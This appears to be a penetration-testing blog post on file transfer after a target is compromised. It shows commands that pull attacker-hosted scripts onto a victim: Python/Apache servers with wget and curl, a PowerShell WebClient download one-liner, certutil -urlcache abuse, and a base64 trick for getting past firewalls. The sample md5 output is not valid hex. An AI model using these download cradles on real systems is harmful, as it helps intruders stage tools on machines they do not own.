---
title:  "File Transfer - Post Exploitation"
path: ""
type: posts
layout: single
author_profile: true
read_time: true
comments: true
share: true
related: true
future: true
toc: true
toc_sticky: true
toc_label: "Table of Contents"
toc_icon: "fas fa-book-open"
header:
    image: https://images.unsplash.com/photo-1512317049220-d3c6fcaf6681?q=80&w=2669&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
    caption: "Photo by [**Ilya Pavlov**](https://unsplash.com/@ilyapavlov) on [**Unsplash**](https://unsplash.com/photos/a-close-up-of-a-computer-screen-with-a-menu-hXrPSgGFpqQ)"
    teaser: https://images.unsplash.com/photo-1512317049220-d3c6fcaf6681?q=80&w=2669&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
---

File transfer is an essential step after we have successfully exploited our target. To transfer files from our target machine to our own system or to upload enumeration scripts to the target, file transfer is inevitable.

# Python HTTP Server
The Python HTTP server is always a go-to method for file transfer.
1. Navigate to the specific directory which contains our file to transfer. Take note that whichever directory we ran the command from will become the root directory in the HTTP server.
2. Run the following command below.<br><br>
For python2:
```
python -m SimpleHTTPServer 9999
```
For python3:
```
python3 -m http.server 9999
```
3. On the remote host which we have code execution on:
```
$ wget http://10.133.133.33:8000/bobby.sh
```
IP 10.133.133.33 belongs to the host machine running the python server on port 8000.<br><br>
If the remote machine does not have `wget`, use `cURL`:
```
curl http://10.133.133.33:8000/bobby.sh -o bobby.sh
```
> -o flag specifies the output file name.<br><br>
`wget` and `cURL` are usually available in Linux machines.

# Apache
In the event when Python is not available in the machine where the source file is located, we can use Apache instead.
1. Move the file which we want to transfer to the `/var/www/html` directory:
```
mv bobby.sh /var/www/html/
```
2. Start the Apache2 service:
```
service apache2 start
```
3. From our target machine, if we have a graphical user interface (GUI), we can fetch our files by using the web browser and visiting:
```
10.133.133.33/bobby.sh
```
For Command Line Interface (CLI), simply use `wget` or `cURL` as discussed above.

# Windows File Transfer
On a Windows OS, the target machine might not have `wget` or `cURL` available. The methods below are suitable for target machines running in Windows.<br><br>
Note that HTTP server has already been set up at source file location. 
## Powershell
We can use a Powershell one-liner to download a file from our HTTP server:
```
powershell -c (New-Object Net.WebClient).DownloadFile('http://ip-addr:port/file', 'output-file')
```
> Use single quotes for URL and output file.

## Certutil.exe
Certutil.exe is a command-line program that is installed as part of Certificate Services. It is used to display certification authority (CA) configuration information, configure Certificate Services and etc. 

However, it can be exploited for other purposes:
```
certutil -urlcache -split -f "http://ip-addr:port/file" [output-file]
```

# Evading Firewall Protections
There might be cases when we are unable to download a file from our host machine at the target due to firewall restrictions.

However, a simple trick is to base64 encode the file into `base64` format and pasting the base64 string on the remote server to decode it.

For example, to transfer a binary file `secret`, we can base64 encode it:
```
$ base64 secret -w 0
sdofeimomOIFFIEOFOAAAAAIAREQQABAAAA...
```
Next, we will copy this base64 string, go to our remote host and `base64 -d` to decode it while piping the output into a file:
```
$ echo sdofeimomOIFFIEOFOAAAAAIAREQQABAAAA... | base64 -d > secret
```

# File Validation
We can run the `file` command to validate the format of a file:
```
$ file secret
secret: ELF 32-bit LSB executable, x86-32, version 1 (SYSV), statically linked, no section header
```
To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run md5sum on it:
```
$ md5sum secret
3434oifoemco3r8834811adf23fcj0la secret
```
Next, we can go to the remote machine to run the same command on the file we have transferred:
```
$ md5sum secret
3434oifoemco3r8834811adf23fcj0la secret
```
With both files having the same md5 hash means that file transfer has been completed successfully.